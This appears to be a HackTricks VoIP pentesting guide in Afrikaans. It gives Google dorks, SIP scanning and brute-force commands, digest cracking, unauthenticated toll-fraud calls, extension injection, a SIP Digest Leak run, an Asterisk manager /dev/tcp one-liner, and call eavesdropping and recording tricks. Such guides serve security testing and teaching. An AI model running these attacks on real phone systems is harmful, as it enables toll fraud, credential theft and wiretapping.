# Pentesting VoIP

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## VoIP Basiese Inligting

Om te begin leer oor hoe VoIP werk, kyk na:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}

## Basiese Boodskappe
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## Reaksie Kodes

**1xx‚ÄîVoorlopige Reaksies**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xx‚ÄîSuksesvolle Reaksies**
```
200 OK
202 Accepted
204 No Notification
```
**3xx‚ÄîAanwysingsreaksies**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xx‚ÄîKli√´nt Fout Reaksies**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xx‚ÄîBedienersmislukkingsreaksies**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xx‚ÄîW√™reldwye Mislukkingsreaksies**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP Opsomming

### Telefoonnommers

Een van die eerste stappe wat 'n Rooi Span kan doen, is om beskikbare telefoonnommers te soek om met die maatskappy in kontak te tree deur OSINT-gereedskap, Google-soektogte of deur die webbladsye af te skuur.

Sodra jy die telefoonnommers het, kan jy aanlyn dienste gebruik om die operateur te identifiseer:

* [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
* [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
* [https://www.whitepages.com/](https://www.whitepages.com/)
* [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

Om te weet of die operateur VoIP-dienste verskaf, kan jy identifiseer of die maatskappy VoIP gebruik... Boonop is dit moontlik dat die maatskappy nie VoIP-dienste ingeskakel het nie, maar PSTN-kaarte gebruik om sy eie VoIP PBX aan te sluit op die tradisionele telefoonnetwerk.

Dinge soos geoutomatiseerde reaksies van musiek dui gewoonlik daarop dat VoIP gebruik word.

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINT inligting

Enige ander OSINT opname wat help om VoIP-sagteware wat gebruik word te identifiseer, sal nuttig wees vir 'n Rooi Span.

### Netwerkopname

* **`nmap`** is in staat om UDP-diens te skandeer, maar as gevolg van die hoeveelheid UDP-diens wat gescandeer word, is dit baie stadig en mag nie baie akkuraat wees met hierdie soort dienste nie.
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** van SIPVicious (`sudo apt install sipvicious`): Sal SIP-diens in die aangeduide netwerk vind.
* `svmap` is **maklik om te blokkeer** omdat dit die Gebruiker-Agent `friendly-scanner` gebruik, maar jy kan die kode vanaf `/usr/share/sipvicious/sipvicious` wysig en dit verander.
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS skandering`** van [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS skandering is 'n baie vinnige skander vir SIP-diens oor UDP, TCP of TLS. Dit gebruik multigeit en kan groot reekse netwerke skandeer. Dit maak dit moontlik om maklik 'n poortreeks aan te dui, beide TCP & UDP te skandeer, 'n ander metode te gebruik (standaard sal dit OPTIONS gebruik) en 'n ander Gebruiker-Agent spesifiseer (en meer).
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### Ekstra Netwerk Opsomming

Die PBX kan ook ander netwerkdienste blootstel soos:

- **69/UDP (TFTP)**: Firmware-opdaterings
- **80 (HTTP) / 443 (HTTPS)**: Om die toestel vanaf die web te bestuur
- **389 (LDAP)**: Alternatief om die gebruikersinligting te stoor
- **3306 (MySQL)**: MySQL-databasis
- **5038 (Bestuurder)**: Laat toe om Asterisk vanaf ander platforms te gebruik
- **5222 (XMPP)**: Boodskappe met behulp van Jabber
- **5432 (PostgreSQL)**: PostgreSQL-databasis
- En ander...

### Metodes Opsomming

Dit is moontlik om **te vind watter metodes beskikbaar is** om in die PBX te gebruik deur `SIPPTS enumerate` te gebruik vanaf [**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### Ontleding van bediener reaksies

Dit is baie belangrik om die koppe te ontleed wat 'n bediener aan ons terugstuur, afhangende van die tipe boodskap en koppe wat ons stuur. Met `SIPPTS send` van [**sippts**](https://github.com/Pepelux/sippts) kan ons gepersonaliseerde boodskappe stuur, al die koppe manipuleer, en die reaksie ontleed.
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
Dit is ook moontlik om data te verkry as die bediener websockets gebruik. Met `SIPPTS wssend` van [**sippts**](https://github.com/Pepelux/sippts) kan ons gepersonaliseerde WS-boodskappe stuur.
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### Uitbreiding Outeurskap

Uitbreidings in 'n PBX (Privaat Takkewisselaar) stelsel verwys na die **unieke interne identifiseerders wat toegewys is aan individuele** telefoonlyne, toestelle, of gebruikers binne 'n organisasie of besigheid. Uitbreidings maak dit moontlik om oproepe binne die organisasie doeltreffend te **roeteer**, sonder die behoefte aan individuele eksterne telefoonnommers vir elke gebruiker of toestel.

* **`svwar`** van SIPVicious (`sudo apt install sipvicious`): `svwar` is 'n gratis SIP PBX uitbreidingslyn-skandeerder. In konsep werk dit soortgelyk aan tradisionele wardialers deur **'n reeks uitbreidings te raai of 'n gegewe lys van uitbreidings**.
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** vanaf [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS exten identifiseer uitbreidings op 'n SIP-bediener. Sipexten kan groot netwerk- en poortreeks toets.
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: Jy kan ook uitbreidings/gebruikersname opspoor met metasploit:
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** is 'n Inter Asterisk Exchange-protokol **gebruikersnaam-brute-force-opsteller**. enumIAX kan in twee afsonderlike modusse werk; Opeenvolgende Gebruikersnaam Raai of Woordeboek Aanval.
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP Aanvalle

### Wagwoord Brute-Force - aanlyn

Nadat die **PBX** en sommige **uitbreidings/gebruikersname** ontdek is, kan 'n Rooi Span probeer om **te verifieer via die `REGISTER` metode** na 'n uitbreiding deur 'n woordeboek van algemene wagwoorde te gebruik om die verifikasie te kragtig.

{% hint style="danger" %}
Let daarop dat 'n **gebruikersnaam** dieselfde as die uitbreiding kan wees, maar hierdie praktyk kan wissel afhangende van die PBX-stelsel, sy opset, en die organisasie se voorkeure...

As die gebruikersnaam nie dieselfde as die uitbreiding is nie, sal jy die **gebruikersnaam moet uitfigureer om dit te kragtig**.
{% endhint %}

* **`svcrack`** van SIPVicious (`sudo apt install sipvicious`): SVCrack stel jou in staat om die wagwoord vir 'n spesifieke gebruikersnaam/uitbreiding op 'n PBX te kragtig.
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** vanaf [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrack is 'n afgele√´ wagwoordkraker vir SIP-diens. Rcrack kan wagwoorde toets vir verskeie gebruikers in verskillende IP-adresse en poortreeks.
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack\_tcp.rb)

### VoIP Sniffing

Indien jy VoIP-toerusting binne 'n **Oop Wifi-netwerk** vind, kan jy **alle inligting afluister**. Verder, as jy binne 'n meer geslote netwerk is (verbind via Ethernet of beskermde Wifi) kan jy **MitM-aanvalle soos** [**ARPspoofing**](../../generic-methodologies-and-resources/pentesting-network/#arp-spoofing) tussen die **PBX en die gateway** uitvoer om die inligting af te luister.

Onder die netwerkinligting kan jy **webgeloofsbriewe** vind om die toerusting te bestuur, gebruiker **uitbreidings**, **gebruikersnaam**, **IP**-adresse, selfs **gehashte wagwoorde** en **RTP-pakkies** wat jy kan herproduseer om die gesprek te **luister**, en meer.

Om hierdie inligting te kry, kan jy gereedskap soos Wireshark, tcpdump... gebruik, maar 'n **spesiaal geskepte gereedskap om VoIP-gesprekke af te luister is** [**ucsniff**](https://github.com/Seabreg/ucsniff).

{% hint style="danger" %}
Let daarop dat as **TLS in die SIP-kommunikasie gebruik word** jy nie die SIP-kommunikasie in die duidelik sal kan sien nie.\
Dieselfde sal gebeur as **SRTP** en **ZRTP** gebruik word, **RTP-pakkies sal nie in teks wees nie**.
{% endhint %}

#### SIP-geloofsbriewe (Wagwoord-Brute-Force - aflyn)

[Kyk na hierdie voorbeeld om 'n **SIP REGISTER-kommunikasie** beter te verstaan](basic-voip-protocols/sip-session-initiation-protocol.md#sip-register-example) om te leer hoe **geloofsbriewe gestuur word**.

* **`sipdump`** & **`sipcrack`,** deel van **sipcrack** (`apt-get install sipcrack`): Hierdie gereedskap kan **digest-autentiserings** binne die SIP-protokol uit 'n **pcap** onttrek en hulle **brute force**.
```bash
sipdump -p net-capture.pcap sip-creds.txt
sipcrack sip-creds.txt -w dict.txt
```
* **`SIPPTS dump`** vanaf [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dump kan digest-verifikasies uittrek uit 'n pcap-l√™er.
```bash
sippts dump -f capture.pcap -o data.txt
```
* **`SIPPTS dcrack`** van [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS dcrack is 'n gereedskap om die digest-autentiserings wat verkry is met SIPPTS dump, te kraak.
```bash
sippts dcrack -f data.txt -w wordlist/rockyou.txt
```
* **`SIPPTS tshark`** vanaf [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS tshark onttrek data van die SIP-protokol uit 'n PCAP-l√™er.
```bash
sippts tshark -f capture.pcap [-filter auth]
```
#### DTMF-kodes

**Nie net SIP-legitimasie** kan gevind word in die netwerkverkeer nie, dit is ook moontlik om DTMF-kodes te vind wat byvoorbeeld gebruik word om die **voicemail** te bereik.\
Dit is moontlik om hierdie kodes in **INFO SIP-boodskappe**, in **klank** of binne **RTP-pakkette** te vind. As die kodes binne RTP-pakkette is, kan jy daardie deel van die gesprek sny en die multimo-werktuig gebruik om hulle te onttrek:
```bash
multimon -a DTMF -t wac pin.wav
```
### Gratis Oproepe / Asterisk-Verbindingsverkeerdekonfigurasies

In Asterisk is dit moontlik om 'n verbinding **vanaf 'n spesifieke IP-adres** of vanaf **enige IP-adres** toe te laat:
```
host=10.10.10.10
host=dynamic
```
Indien 'n IP-adres gespesifiseer is, sal die gasheer **nie nodig h√™ om REGISTER-aanvrae** elke rukkie te stuur (in die REGISTER-pakket word die tyd tot lewe gestuur, gewoonlik 30 minute, wat beteken dat in 'n ander scenario die telefoon elke 30 minute sal moet REGISTER). Tog sal dit oop poorte moet h√™ wat verbinding vanaf die VoIP-bediener toelaat om oproepe te ontvang.

Om gebruikers te definieer, kan hulle as volg gedefinieer word:

* **`type=user`**: Die gebruiker kan slegs oproepe ontvang as gebruiker.
* **`type=friend`**: Dit is moontlik om oproepe te doen as eweknie en hulle as gebruiker te ontvang (gebruik met uitbreidings)
* **`type=peer`**: Dit is moontlik om oproepe te stuur en te ontvang as eweknie (SIP-trunke)

Dit is ook moontlik om vertroue te vestig met die onveilige veranderlike:

* **`insecure=port`**: Laat eweknieverbindinge toe wat geverifieer word deur IP.
* **`insecure=invite`**: Vereis nie outentisering vir INVITE-boodskappe nie
* **`insecure=port,invite`**: Beide

{% hint style="warning" %}
Wanneer **`type=friend`** gebruik word, sal die **waarde** van die **host**-veranderlike **nie gebruik word nie**, so as 'n administrateur 'n SIP-trunk verkeerd instel met daardie waarde, **sal enigiemand daaraan kan koppel**.

Byvoorbeeld, hierdie konfigurasie sou kwesbaar wees:\
`host=10.10.10.10`\
`insecure=port,invite`\
`type=friend`
{% endhint %}

### Gratis Oproepe / Asterisk Konteks Verkeerde Instellings

In Asterisk is 'n **konteks** 'n benoemde houer of afdeling in die kiesplan wat **verwante uitbreidings, aksies, en re√´ls groepeer**. Die kiesplan is die kernkomponent van 'n Asterisk-sisteem, aangesien dit bepaal **hoe inkomende en uitgaande oproepe hanteer en gerouteer word**. Kontekste word gebruik om die kiesplan te organiseer, toegangsbeheer te bestuur, en skeiding tussen verskillende dele van die stelsel te bied.

Elke konteks word in die konfigurasie-l√™er gedefinieer, tipies in die **`extensions.conf`**-l√™er. Kontekste word aangedui deur vierkante hakies, met die konteksnaam binne-in hulle ingesluit. Byvoorbeeld:
```bash
csharpCopy code[my_context]
```
Binne die konteks, definieer jy uitbreidings (patrone van gekiesde nommers) en assosieer hulle met 'n reeks van aksies of toepassings. Hierdie aksies bepaal hoe die oproep verwerk word. Byvoorbeeld:
```scss
[my_context]
exten => 100,1,Answer()
exten => 100,n,Playback(welcome)
exten => 100,n,Hangup()
```
Hierdie voorbeeld demonstreer 'n eenvoudige konteks genaamd "my\_context" met 'n uitbreiding "100". Wanneer iemand 100 kies, sal die oproep beantwoord word, 'n verwelkomingsboodskap gespeel word, en dan sal die oproep be√´indig word.

Dit is **'n ander konteks** wat toelaat om **na enige ander nommer te bel**:
```scss
[external]
exten => _X.,1,Dial(SIP/trunk/${EXTEN})
```
Indien die admin die **verstek konteks** definieer as:
```
[default]
include => my_context
include => external
```
{% hint style="warning" %}
Enige persoon sal in staat wees om die **bediener te gebruik om na enige ander nommer te bel** (en die administrateur van die bediener sal vir die oproep betaal).
{% endhint %}

{% hint style="danger" %}
Verder, as die **`sip.conf`** l√™er standaard **`allowguest=true`** bevat, sal **enige** aanvaller sonder outentifikasie in staat wees om na enige ander nommer te bel.
{% endhint %}

*   **`SIPPTS uitnodiging`** van [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS-uitnodiging toets of 'n **PBX-bedieners ons toelaat om oproepe sonder outentifikasie te maak**. As die SIP-bediener 'n verkeerde konfigurasie het, sal dit ons toelaat om oproepe na eksterne nommers te maak. Dit kan ons ook toelaat om die oproep na 'n tweede eksterne nommer oor te plaas.

Byvoorbeeld, as jou Asterisk-bediener 'n slegte konteks-konfigurasie het, kan jy INVITE-versoeke sonder outorisasie aanvaar. In hierdie geval kan 'n aanvaller oproepe maak sonder om enige gebruikersnaam/wagwoord te ken.

{% code overflow="wrap" %}
```bash
# Trying to make a call to the number 555555555 (without auth) with source number 200.
sippts invite -i  10.10.0.10 -fu 200 -tu 555555555 -v

# Trying to make a call to the number 555555555 (without auth) and transfer it to number 444444444.
sippts invite -i 10.10.0.10 -tu 555555555 -t 444444444
```
{% endcode %}

### Gratis oproepe / Verkeerd geconfigureerde IVRS

IVRS staan vir **Interaktiewe Stemresponsstelsel**, 'n telefonie tegnologie wat gebruikers in staat stel om met 'n gerekenariseerde stelsel te interaksieer deur stem- of toets-toon insette. IVRS word gebruik om **geoutomatiseerde oproephantering** stelsels te bou wat 'n verskeidenheid funksies bied, soos die voorsiening van inligting, roete oproepe, en die vasvang van gebruiker insette.

IVRS in VoIP-stelsels bestaan tipies uit:

1. **Stem aanwysings**: Vooraf opgeneemde klankboodskappe wat gebruikers deur die IVR-menu opsies en instruksies lei.
2. **DTMF** (Dubbel-Toon Multi-Frekwensie) sein: Toets-toon insette wat gegenereer word deur sleutels op die foon te druk, wat gebruik word om deur die IVR-menu's te navigeer en insette te voorsien.
3. **Oproep roeteering**: Oproepe stuur na die toepaslike bestemming, soos spesifieke departemente, agente, of uitbreidings gebaseer op gebruiker insette.
4. **Gebruiker inset vasvang**: Inligting van oproepers insamel, soos rekeningnommers, saak-ID's, of enige ander relevante data.
5. **Integrasie met eksterne stelsels**: Die koppeling van die IVR-stelsel aan databasisse of ander sagteware stelsels om inligting te ontsluit of op te dateer, aksies uit te voer, of gebeurtenisse te aktiveer.

In 'n Asterisk VoIP-stelsel kan jy 'n IVR skep deur die kiesplan te gebruik (**`extensions.conf`** l√™er) en verskeie toepassings soos `Background()`, `Playback()`, `Read()`, en meer. Hierdie toepassings help jou om stem aanwysings af te speel, gebruiker insette vas te vang, en die oproepvloei te beheer.

#### Voorbeeld van 'n kwesbare konfigurasie
```scss
exten => 0,100,Read(numbers,the_call,,,,5)
exten => 0,101,GotoIf("$[${numbers}"="1"]?200)
exten => 0,102,GotoIf("$[${numbers}"="2"]?300)
exten => 0,103,GotoIf("$[${numbers}"=""]?100)
exten => 0,104,Dial(LOCAL/${numbers})
```
Die vorige is 'n voorbeeld waar die gebruiker gevra word om **1 te druk om te skakel** na 'n afdeling, **2 om te skakel** na 'n ander, of **die volledige uitbreiding** as hy dit weet. Die kwesbaarheid is die feit dat die aangeduide **uitbreidingslengte nie nagegaan word nie, sodat 'n gebruiker die 5 sekondes tydlimiet 'n volledige nommer kan invoer en dit sal geskakel word.**

### Uitbreidingsinspuiting

Deur 'n uitbreiding soos:
```scss
exten => _X.,1,Dial(SIP/${EXTEN})
```
Waar **`${EXTEN}`** die **uitbreiding** is wat geskakel sal word, wanneer die **ext 101 ingevoer word** is dit wat sou gebeur:
```scss
exten => 101,1,Dial(SIP/101)
```
Echter, as **`${EXTEN}`** toelaat om **meer as net syfers** in te voer (soos in ouer Asterisk weergawes), kan 'n aanvaller **`101&SIP123123123`** invoer om die telefoonnommer 123123123 te skakel. En dit sou die resultaat wees:
```scss
exten => 101&SIP123123123,1,Dial(SIP/101&SIP123123123)
```
Daarom sal 'n oproep na die uitbreiding **`101`** en **`123123123`** gestuur word en slegs die eerste wat die oproep ontvang, sal gevestig word... maar as 'n aanvaller 'n **uitbreiding gebruik wat enige ooreenkoms omseil** wat uitgevoer word maar nie bestaan nie, kan hy **'n oproep net na die gewenste nommer inspuit**.

## SIPDigestLeak kwesbaarheid

Die SIP Digest Leak is 'n kwesbaarheid wat 'n groot aantal SIP-telefone affekteer, insluitend beide hardeware- en sagteware-IP-telefone asook telefoonadapters (VoIP na analoog). Die kwesbaarheid maak **lek van die Digest-verifikasierespons** moontlik, wat bereken word uit die wagwoord. 'n **Aanlyn wagwoordaanval is dan moontlik** en kan die meeste wagwoorde herwin op grond van die uitdagingrespons.

**[Kwesbaarheid scenario vanaf hier**](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf):

1. 'n IP-telefoon (slagoffer) luister na enige poort (byvoorbeeld: 5060), aanvaar telefoonoproepe
2. Die aanvaller stuur 'n UITNODIGING na die IP-telefoon
3. Die slagoffer-telefoon begin lui en iemand neem op en hou op (omdat niemand die telefoon aan die ander kant antwoord nie)
4. Wanneer die telefoon neergel√™ word, stuur die **slagoffer-telefoon 'n AFSKEID na die aanvaller**
5. Die **aanvaller gee 'n 407 respons** wat **vir verifikasie vra** en gee 'n verifikasie-uitdaging
6. Die **slagoffer-telefoon verskaf 'n respons op die verifikasie-uitdaging** in 'n tweede AFSKEID
7. Die **aanvaller kan dan 'n brute-kragaanval uitvoer** op die uitdagingrespons op sy plaaslike masjien (of verspreide netwerk ens.) en die wagwoord raai

* **SIPPTS-lek** vanaf [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS-lek maak gebruik van die SIP Digest Leak kwesbaarheid wat 'n groot aantal SIP-telefone affekteer. Die uitset kan in SipCrack-formaat gestoor word om dit te kraak met behulp van SIPPTS dcrack of die SipCrack-instrument.
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Klik-om-Te-Skakel

Klik-om-Te-Skakel maak dit vir 'n **webgebruiker** (wat byvoorbeeld dalk belangstel in 'n produk) moontlik om sy **telefoonnommer in te voer** om geskakel te word. Dan sal 'n advertensie geskakel word, en wanneer hy **die telefoon optel** sal die gebruiker **geskakel en gekoppel word met die agent**.

'n Gewone Asterisk-profiel hiervoor is:
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* Die vorige profiel laat **ENIGE IP-adres toe om te koppel** (as die wagwoord bekend is).
* Om **'n oproep te organiseer**, soos voorheen gespesifiseer, is **geen leesregte nodig** en slegs **oorsprong** in **skryf** is nodig.

Met daardie regte kan enige IP-adres wat die wagwoord ken, koppel en te veel inligting onttrek, soos:
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**Meer inligting of aksies kan aangevra word.**

### **Afluistering**

In Asterisk is dit moontlik om die bevel **`ChanSpy`** te gebruik wat die **uitbreiding(e) om te monitor** (of almal) aandui om gesprekke wat plaasvind, te hoor. Hierdie bevel moet toegewys word aan 'n uitbreiding.

Byvoorbeeld, **`exten => 333,1,ChanSpy('all',qb)`** dui aan dat as jy die **uitbreiding 333** **skakel**, dit **alle** die uitbreidings sal **monitor**, **begin luister** wanneer 'n nuwe gesprek begin (**`b`**) in stille modus (**`q`**) aangesien ons nie daarmee wil interageer nie. Jy kan van die een gesprek na die ander gaan deur op **`*`** te druk, of deur die uitbreidingsnommer te merk.

Dit is ook moontlik om **`ExtenSpy`** te gebruik om slegs een uitbreiding te monitor.

In plaas van om na die gesprekke te luister, is dit moontlik om hulle in l√™ers **op te neem** deur 'n uitbreiding soos die volgende te gebruik:

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

Oproepe sal gestoor word in **`/tmp`**.

Jy kan selfs Asterisk laat **'n skrip uitvoer wat die oproep sal laat uitlek** wanneer dit gesluit word.
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleed kwetsbaarheid

**RTCPBleed** is 'n groot sekuriteitsprobleem wat Asterisk-gebaseerde VoIP-bedieners affekteer (gepubliseer in 2017). Die kwetsbaarheid maak dit moontlik vir **RTP (Real Time Protocol) verkeer**, wat VoIP-gesprekke vervoer, om deur enigiemand op die Internet **onderskep en omgelei te word**. Dit gebeur omdat RTP-verkeer verifikasie omseil wanneer dit deur NAT (Network Address Translation) vuurmuure navigeer.

RTP-proksi's probeer om **NAT-beperkings** wat RTC-stelsels affekteer, aan te spreek deur RTP-strome tussen twee of meer partye te proksi√´er. Wanneer NAT in plek is, kan die RTP-proksi sagteware dikwels nie staatmaak op die RTP IP- en poortinligting wat deur seinering (bv. SIP) verkry is nie. Daarom het 'n aantal RTP-proksi's 'n meganisme ge√Ømplementeer waar sulke **IP- en poorttuplet outomaties geleer word**. Dit word dikwels gedoen deur inkomende RTP-verkeer te ondersoek en die bron IP en poort vir enige inkomende RTP-verkeer te merk as die een waarop geantwoord moet word. Hierdie meganisme, wat "leermodus" genoem kan word, **maak nie gebruik van enige vorm van verifikasie nie**. Daarom kan **aanvallers** RTP-verkeer na die RTP-proksi **stuur en die geprokseerde RTP-verkeer ontvang wat bedoel is vir die oeper of ontvanger van 'n aan die gang synde RTP-stroom**. Ons noem hierdie kwetsbaarheid RTP Bleed omdat dit aanvallers in staat stel om RTP-mediastrome te ontvang wat bedoel is om na wettige gebruikers gestuur te word.

'n Ander interessante gedrag van RTP-proksi's en RTP-stelsels is dat hulle soms, selfs as hulle nie vatbaar is vir RTP Bleed nie, **RTP-pakkette van enige bron sal aanvaar, deurstuur en/of verwerk**. Daarom kan aanvallers RTP-pakkette stuur wat hulle kan toelaat om hul media in te spuit in plaas van die wettige een. Ons noem hierdie aanval RTP-inspuiting omdat dit die inspuiting van onwettige RTP-pakkette in bestaande RTP-strome moontlik maak. Hierdie kwetsbaarheid kan in beide RTP-proksi's en eindpunte gevind word.

Asterisk en FreePBX het tradisioneel die **`NAT=yes` instelling** gebruik, wat dit moontlik maak vir RTP-verkeer om verifikasie te omseil, wat moontlik lei tot geen klank of eenrigtingklank in oproepe nie.

Vir meer inligting besoek [https://www.rtpbleed.com/](https://www.rtpbleed.com/)

